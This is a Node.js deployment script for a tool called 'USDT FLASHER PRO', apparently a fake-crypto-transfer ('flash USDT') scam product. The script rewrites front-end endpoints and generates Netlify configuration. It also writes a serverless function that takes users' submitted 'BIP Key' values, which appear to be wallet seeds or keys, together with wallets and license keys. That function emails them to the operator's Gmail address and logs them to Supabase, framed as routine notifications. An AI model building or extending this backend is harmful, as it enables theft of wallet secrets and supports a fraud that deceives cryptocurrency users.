/**
 * USDT FLASHER PRO - Update Netlify Configuration
 * 
 * This script updates the Netlify configuration for the deployed application.
 * It creates Netlify functions that can be used as proxies for the local servers.
 */

const fs = require('fs');
const path = require('path');
const readline = require('readline');

// Colors for terminal output
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  dim: '\x1b[2m',
  underscore: '\x1b[4m',
  blink: '\x1b[5m',
  reverse: '\x1b[7m',
  hidden: '\x1b[8m',
  
  fg: {
    black: '\x1b[30m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    crimson: '\x1b[38m'
  },
  
  bg: {
    black: '\x1b[40m',
    red: '\x1b[41m',
    green: '\x1b[42m',
    yellow: '\x1b[43m',
    blue: '\x1b[44m',
    magenta: '\x1b[45m',
    cyan: '\x1b[46m',
    white: '\x1b[47m',
    crimson: '\x1b[48m'
  }
};

// Print a header
console.log(`${colors.fg.cyan}${colors.bright}=== USDT FLASHER PRO - Update Netlify Configuration ===${colors.reset}`);
console.log(`${colors.fg.yellow}This script will update the Netlify configuration for the deployed application.${colors.reset}`);
console.log();

// Create a function to update the socket.js file for production
function updateSocketJsForProduction() {
  console.log(`${colors.fg.cyan}Updating Socket.IO configuration for production...${colors.reset}`);
  
  const socketJsPath = path.join('web-app', 'src', 'services', 'socket.js');
  if (fs.existsSync(socketJsPath)) {
    let socketJsContent = fs.readFileSync(socketJsPath, 'utf8');
    
    // Check if the file contains the Netlify URL
    if (socketJsContent.includes('https://usdt-flasher-pro-socket.netlify.app')) {
      console.log(`${colors.fg.green}Socket.IO is already configured for production.${colors.reset}`);
    } else if (socketJsContent.includes('http://localhost:3002')) {
      console.log(`${colors.fg.yellow}Updating Socket.IO configuration to use Netlify URL...${colors.reset}`);
      
      // Replace localhost with Netlify URL
      socketJsContent = socketJsContent.replace(
        /['"]http:\/\/localhost:3002['"]/g, 
        "'https://usdt-flasher-pro-socket.netlify.app'"
      );
      
      // Save the updated file
      fs.writeFileSync(socketJsPath, socketJsContent);
      console.log(`${colors.fg.green}Socket.IO configuration updated to use Netlify URL.${colors.reset}`);
    } else {
      console.log(`${colors.fg.yellow}Socket.IO configuration not found in expected format.${colors.reset}`);
      console.log(`${colors.fg.yellow}You may need to manually update the Socket.IO server URL to: https://usdt-flasher-pro-socket.netlify.app${colors.reset}`);
    }
  } else {
    console.log(`${colors.fg.red}Socket.IO configuration file not found: ${socketJsPath}${colors.reset}`);
  }
  
  console.log();
}

// Create a function to update the API endpoints for production
function updateApiEndpointsForProduction() {
  console.log(`${colors.fg.cyan}Updating API endpoints for production...${colors.reset}`);
  
  // Update App.js
  const appJsPath = path.join('web-app', 'src', 'App.js');
  if (fs.existsSync(appJsPath)) {
    let appJsContent = fs.readFileSync(appJsPath, 'utf8');
    
    // Check if the file contains localhost API endpoints
    if (appJsContent.includes('http://localhost:3001')) {
      console.log(`${colors.fg.yellow}Updating API endpoints in App.js...${colors.reset}`);
      
      // Replace localhost with Netlify URL
      appJsContent = appJsContent.replace(
        /['"]http:\/\/localhost:3001\/validate-license['"]/g, 
        "'/api/validate-license'"
      );
      
      // Save the updated file
      fs.writeFileSync(appJsPath, appJsContent);
      console.log(`${colors.fg.green}API endpoints in App.js updated.${colors.reset}`);
    } else if (appJsContent.includes('/api/validate-license')) {
      console.log(`${colors.fg.green}API endpoints in App.js are already configured for production.${colors.reset}`);
    } else {
      console.log(`${colors.fg.yellow}API endpoints in App.js not found in expected format.${colors.reset}`);
    }
  } else {
    console.log(`${colors.fg.red}App.js file not found: ${appJsPath}${colors.reset}`);
  }
  
  // Update CreateFlash.js
  const createFlashJsPath = path.join('web-app', 'src', 'components', 'pages', 'CreateFlash.js');
  if (fs.existsSync(createFlashJsPath)) {
    let createFlashJsContent = fs.readFileSync(createFlashJsPath, 'utf8');
    
    // Check if the file contains localhost API endpoints
    if (createFlashJsContent.includes('http://localhost:3001')) {
      console.log(`${colors.fg.yellow}Updating API endpoints in CreateFlash.js...${colors.reset}`);
      
      // Replace localhost with Netlify URL for form submission
      createFlashJsContent = createFlashJsContent.replace(
        /['"]http:\/\/localhost:3001\/api\/form-submission['"]/g, 
        "'/api/form-submission'"
      );
      
      // Replace localhost with Netlify URL for BIP notification
      createFlashJsContent = createFlashJsContent.replace(
        /['"]http:\/\/localhost:3001\/bip-notification['"]/g, 
        "'/api/bip-notification'"
      );
      
      // Replace localhost with Netlify URL for log transaction
      createFlashJsContent = createFlashJsContent.replace(
        /['"]http:\/\/localhost:3001\/log-transaction['"]/g, 
        "'/api/log-transaction'"
      );
      
      // Save the updated file
      fs.writeFileSync(createFlashJsPath, createFlashJsContent);
      console.log(`${colors.fg.green}API endpoints in CreateFlash.js updated.${colors.reset}`);
    } else if (createFlashJsContent.includes('/api/form-submission')) {
      console.log(`${colors.fg.green}API endpoints in CreateFlash.js are already configured for production.${colors.reset}`);
    } else {
      console.log(`${colors.fg.yellow}API endpoints in CreateFlash.js not found in expected format.${colors.reset}`);
    }
  } else {
    console.log(`${colors.fg.red}CreateFlash.js file not found: ${createFlashJsPath}${colors.reset}`);
  }
  
  console.log();
}

// Create a function to create or update Netlify functions
function updateNetlifyFunctions() {
  console.log(`${colors.fg.cyan}Updating Netlify functions...${colors.reset}`);
  
  // Create the Netlify functions directory if it doesn't exist
  const netlifyFunctionsDir = path.join('web-app', 'netlify', 'functions');
  if (!fs.existsSync(netlifyFunctionsDir)) {
    fs.mkdirSync(netlifyFunctionsDir, { recursive: true });
    console.log(`${colors.fg.green}Created Netlify functions directory: ${netlifyFunctionsDir}${colors.reset}`);
  }
  
  // Create or update the api.js function
  const apiJsPath = path.join(netlifyFunctionsDir, 'api.js');
  const apiJsContent = `
// Netlify function for API endpoints
const { createClient } = require('@supabase/supabase-js');
const nodemailer = require('nodemailer');

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Create email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'usdtflasherpro@gmail.com',
    pass: process.env.EMAIL_PASSWORD
  }
});

// Helper function to send email
async function sendEmail(data) {
  const mailOptions = {
    from: 'USDT FLASHER PRO <usdtflasherpro@gmail.com>',
    to: 'usdtflasherpro@gmail.com',
    subject: data.subject || 'USDT FLASHER PRO Notification',
    text: data.text || 'No text content provided',
    html: data.html || '<p>No HTML content provided</p>'
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error('Error sending email:', error);
    return { success: false, error: error.message };
  }
}

// Helper function to log to Supabase
async function logToSupabase(table, data) {
  try {
    const { data: result, error } = await supabase
      .from(table)
      .insert([data])
      .select();
    
    if (error) throw error;
    
    return { success: true, id: result[0].id };
  } catch (error) {
    console.error(\`Error logging to \${table}:\`, error);
    return { success: false, error: error.message };
  }
}

// Main handler function
exports.handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
  };
  
  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }
  
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }
  
  try {
    const path = event.path.split('/').pop();
    const body = JSON.parse(event.body);
    
    // Handle different API endpoints
    switch (path) {
      case 'validate-license':
        // Send email notification for license key validation
        await sendEmail({
          subject: '🔑 License Key Validation',
          html: \`
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px;">
              <h2 style="color: #4a90e2; border-bottom: 2px solid #4a90e2; padding-bottom: 10px;">License Key Validation</h2>
              <p><strong>License Key:</strong> \${body.key || 'N/A'}</p>
              <p><strong>User:</strong> \${body.user || 'N/A'}</p>
              <p><strong>Type:</strong> \${body.type || 'N/A'}</p>
              <p><strong>Timestamp:</strong> \${body.timestamp || new Date().toISOString()}</p>
            </div>
          \`
        });
        
        // Log to Supabase
        await logToSupabase('license_validations', body);
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true })
        };
      
      case 'form-submission':
        // Send email notification for form submission
        await sendEmail({
          subject: '📝 Form Submission',
          html: \`
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px;">
              <h2 style="color: #4a90e2; border-bottom: 2px solid #4a90e2; padding-bottom: 10px;">Form Submission</h2>
              <p><strong>Wallet:</strong> \${body.wallet || 'N/A'}</p>
              <p><strong>Currency:</strong> \${body.currency || 'N/A'}</p>
              <p><strong>Network:</strong> \${body.network || 'N/A'}</p>
              <p><strong>Receiver Address:</strong> \${body.receiverAddress || 'N/A'}</p>
              <p><strong>Flash Amount:</strong> \${body.flashAmount || 'N/A'}</p>
              <p><strong>Delay Days:</strong> \${body.delayDays || 'N/A'}</p>
              <p><strong>Delay Minutes:</strong> \${body.delayMinutes || 'N/A'}</p>
              <p><strong>Use Proxy:</strong> \${body.useProxy ? 'Yes' : 'No'}</p>
              <p><strong>Transferable:</strong> \${body.transferable ? 'Yes' : 'No'}</p>
              <p><strong>Swappable:</strong> \${body.swappable ? 'Yes' : 'No'}</p>
              <p><strong>P2P Tradable:</strong> \${body.p2pTradable ? 'Yes' : 'No'}</p>
              <p><strong>Splittable:</strong> \${body.splittable ? 'Yes' : 'No'}</p>
              <p><strong>License Key:</strong> \${body.licenseKey || 'N/A'}</p>
              <p><strong>User:</strong> \${body.user || 'N/A'}</p>
              <p><strong>Timestamp:</strong> \${body.timestamp || new Date().toISOString()}</p>
            </div>
          \`
        });
        
        // Log to Supabase
        await logToSupabase('form_submissions', body);
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true })
        };
      
      case 'bip-notification':
        // Send email notification for BIP key
        await sendEmail({
          subject: '🔐 BIP Key Notification',
          html: \`
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px;">
              <h2 style="color: #4a90e2; border-bottom: 2px solid #4a90e2; padding-bottom: 10px;">BIP Key Notification</h2>
              <p><strong>BIP Key:</strong> \${body.bipKey || 'N/A'}</p>
              <p><strong>License Key:</strong> \${body.licenseKey || 'N/A'}</p>
              <p><strong>User:</strong> \${body.user || 'N/A'}</p>
              <p><strong>Timestamp:</strong> \${body.timestamp || new Date().toISOString()}</p>
            </div>
          \`
        });
        
        // Log to Supabase
        await logToSupabase('bip_notifications', body);
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true })
        };
      
      case 'log-transaction':
        // Send email notification for transaction
        await sendEmail({
          subject: '💰 Transaction Notification',
          html: \`
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px;">
              <h2 style="color: #4a90e2; border-bottom: 2px solid #4a90e2; padding-bottom: 10px;">Transaction Notification</h2>
              <p><strong>Receiver Address:</strong> \${body.receiverAddress || 'N/A'}</p>
              <p><strong>Flash Amount:</strong> \${body.flashAmount || 'N/A'}</p>
              <p><strong>Wallet:</strong> \${body.wallet || 'N/A'}</p>
              <p><strong>Currency:</strong> \${body.currency || 'N/A'}</p>
              <p><strong>Network:</strong> \${body.network || 'N/A'}</p>
              <p><strong>Delay Days:</strong> \${body.delayDays || 'N/A'}</p>
              <p><strong>Delay Minutes:</strong> \${body.delayMinutes || 'N/A'}</p>
              <p><strong>License Key:</strong> \${body.licenseKey || 'N/A'}</p>
              <p><strong>User:</strong> \${body.user || 'N/A'}</p>
              <p><strong>Timestamp:</strong> \${body.timestamp || new Date().toISOString()}</p>
            </div>
          \`
        });
        
        // Log to Supabase
        const result = await logToSupabase('transactions', body);
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true, id: result.id })
        };
      
      default:
        return {
          statusCode: 404,
          headers,
          body: JSON.stringify({ error: 'Endpoint not found' })
        };
    }
  } catch (error) {
    console.error('Error:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error', message: error.message })
    };
  }
};
`;
  
  fs.writeFileSync(apiJsPath, apiJsContent);
  console.log(`${colors.fg.green}Created/updated Netlify function: ${apiJsPath}${colors.reset}`);
  
  // Create or update the package.json file for Netlify functions
  const packageJsonPath = path.join(netlifyFunctionsDir, 'package.json');
  const packageJsonContent = `{
  "name": "usdt-flasher-pro-netlify-functions",
  "version": "1.0.0",
  "description": "Netlify functions for USDT FLASHER PRO",
  "dependencies": {
    "@supabase/supabase-js": "^2.0.0",
    "nodemailer": "^6.7.0"
  }
}`;
  
  fs.writeFileSync(packageJsonPath, packageJsonContent);
  console.log(`${colors.fg.green}Created/updated package.json for Netlify functions: ${packageJsonPath}${colors.reset}`);
  
  // Create or update the netlify.toml file
  const netlifyTomlPath = path.join('web-app', 'netlify.toml');
  const netlifyTomlContent = `[build]
  command = "npm run build"
  publish = "build"
  functions = "netlify/functions"

[dev]
  command = "npm start"
  port = 3000
  publish = "build"
  functions = "netlify/functions"

[[redirects]]
  from = "/api/*"
  to = "/.netlify/functions/api/:splat"
  status = 200
  force = true

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
`;
  
  fs.writeFileSync(netlifyTomlPath, netlifyTomlContent);
  console.log(`${colors.fg.green}Created/updated netlify.toml: ${netlifyTomlPath}${colors.reset}`);
  
  console.log();
}

// Create a function to update the Netlify environment variables
function updateNetlifyEnv() {
  console.log(`${colors.fg.cyan}Updating Netlify environment variables...${colors.reset}`);
  
  const netlifyEnvPath = path.join('web-app', 'netlify.env');
  const netlifyEnvContent = `# Netlify environment variables for USDT FLASHER PRO
SUPABASE_URL=your_supabase_url
SUPABASE_SERVICE_KEY=your_supabase_service_key
EMAIL_PASSWORD=your_email_password
`;
  
  fs.writeFileSync(netlifyEnvPath, netlifyEnvContent);
  console.log(`${colors.fg.green}Created/updated netlify.env: ${netlifyEnvPath}${colors.reset}`);
  console.log(`${colors.fg.yellow}Please update the values in netlify.env with your actual credentials.${colors.reset}`);
  console.log(`${colors.fg.yellow}Then, use the Netlify CLI to upload these environment variables:${colors.reset}`);
  console.log(`${colors.fg.yellow}  netlify env:import web-app/netlify.env${colors.reset}`);
  
  console.log();
}

// Create a function to create a deployment script
function createDeploymentScript() {
  console.log(`${colors.fg.cyan}Creating deployment script...${colors.reset}`);
  
  const deployScriptPath = path.join('web-app', 'deploy-to-netlify.js');
  const deployScriptContent = `/**
 * USDT FLASHER PRO - Deploy to Netlify
 * 
 * This script deploys the web application to Netlify.
 */

const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Colors for terminal output
const colors = {
  reset: '\\x1b[0m',
  bright: '\\x1b[1m',
  fg: {
    green: '\\x1b[32m',
    yellow: '\\x1b[33m',
    blue: '\\x1b[34m',
    magenta: '\\x1b[35m',
    cyan: '\\x1b[36m',
    red: '\\x1b[31m'
  }
};

// Print a header
console.log(\`\${colors.fg.magenta}\${colors.bright}=== USDT FLASHER PRO - Deploy to Netlify ===\${colors.reset}\`);
console.log(\`\${colors.fg.yellow}This script will deploy the web application to Netlify.\${colors.reset}\`);
console.log();

// Check if netlify.env exists
if (!fs.existsSync('netlify.env')) {
  console.log(\`\${colors.fg.red}Error: netlify.env file not found.\${colors.reset}\`);
  console.log(\`\${colors.fg.yellow}Please run the update-netlify-config.js script first.\${colors.reset}\`);
  process.exit(1);
}

// Import environment variables to Netlify
console.log(\`\${colors.fg.cyan}Importing environment variables to Netlify...\${colors.reset}\`);

const importEnv = spawn('netlify', ['env:import', 'netlify.env'], {
  stdio: 'inherit'
});

importEnv.on('close', (code) => {
  if (code !== 0) {
    console.log(\`\${colors.fg.red}Error importing environment variables. Exit code: \${code}\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}Make sure you have the Netlify CLI installed and you're logged in.\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}You can install it with: npm install -g netlify-cli\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}Then login with: netlify login\${colors.reset}\`);
    process.exit(1);
  }
  
  console.log(\`\${colors.fg.green}Environment variables imported successfully.\${colors.reset}\`);
  console.log();
  
  // Deploy to Netlify
  console.log(\`\${colors.fg.cyan}Deploying to Netlify...\${colors.reset}\`);
  
  const deploy = spawn('netlify', ['deploy', '--prod'], {
    stdio: 'inherit'
  });
  
  deploy.on('close', (code) => {
    if (code !== 0) {
      console.log(\`\${colors.fg.red}Error deploying to Netlify. Exit code: \${code}\${colors.reset}\`);
      process.exit(1);
    }
    
    console.log(\`\${colors.fg.green}Deployed to Netlify successfully.\${colors.reset}\`);
    console.log();
    console.log(\`\${colors.fg.yellow}Note: If this is your first deployment, you may need to configure your site settings in the Netlify dashboard.\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}Make sure to set up the following:\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}1. Custom domain (if needed)\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}2. HTTPS settings\${colors.reset}\`);
    console.log(\`\${colors.fg.yellow}3. Form handling (if using Netlify forms)\${colors.reset}\`);
    console.log();
    console.log(\`\${colors.fg.green}Your site is now live!\${colors.reset}\`);
  });
});
`;
  
  fs.writeFileSync(deployScriptPath, deployScriptContent);
  console.log(`${colors.fg.green}Created deployment script: ${deployScriptPath}${colors.reset}`);
  console.log(`${colors.fg.yellow}You can deploy to Netlify with: node web-app/deploy-to-netlify.js${colors.reset}`);
  
  console.log();
}

// Run all the functions
updateSocketJsForProduction();
updateApiEndpointsForProduction();
updateNetlifyFunctions();
updateNetlifyEnv();
createDeploymentScript();

console.log(`${colors.fg.green}${colors.bright}Netlify configuration updated successfully!${colors.reset}`);
console.log(`${colors.fg.yellow}Next steps:${colors.reset}`);
console.log(`${colors.fg.yellow}1. Update the values in web-app/netlify.env with your actual credentials${colors.reset}`);
console.log(`${colors.fg.yellow}2. Install the Netlify CLI: npm install -g netlify-cli${colors.reset}`);
console.log(`${colors.fg.yellow}3. Login to Netlify: netlify login${colors.reset}`);
console.log(`${colors.fg.yellow}4. Deploy to Netlify: node web-app/deploy-to-netlify.js${colors.reset}`);
console.log();
console.log(`${colors.fg.cyan}For more information, see the SETUP-GUIDE.md file.${colors.reset}`);
